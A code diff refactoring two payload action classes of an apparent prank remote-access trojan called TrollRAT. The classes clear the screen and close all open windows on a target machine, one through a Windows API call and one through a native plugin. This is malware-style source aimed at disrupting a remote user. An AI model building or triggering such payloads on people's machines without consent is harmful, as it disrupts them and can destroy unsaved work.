@@ -21,32 +21,36 @@ namespace TrollRATActions
 
     public class PayloadActionClearScreen : SimplePayloadAction
     {
+        public PayloadActionClearScreen(Payload payload) : base(payload) { }
+
         [DllImport("user32.dll")]
         static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, int flags);
 
-        public override string execute(Payload payload)
+        public override string execute()
         {
             RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 133);
             return "void(0);";
         }
 
-        public override string getIcon(Payload payload) { return null; }
-        public override string getTitle(Payload payload) { return "Clear Screen"; }
+        public override string Icon => null;
+        public override string Title => "Clear Screen";
     }
 
     public class PayloadActionClearWindows : SimplePayloadAction
     {
+        public PayloadActionClearWindows(Payload payload) : base(payload) { }
+
         [DllImport("Plugins\\TrollRATNative.dll")]
         static extern void clearWindows();
 
-        public override string execute(Payload payload)
+        public override string execute()
         {
             clearWindows();
             return "void(0);";
         }
 
-        public override string getIcon(Payload payload) { return null; }
-        public override string getTitle(Payload payload) { return "Close open Windows"; }
+        public override string Icon => null;
+        public override string Title => "Close open Windows";
     }
 
 }
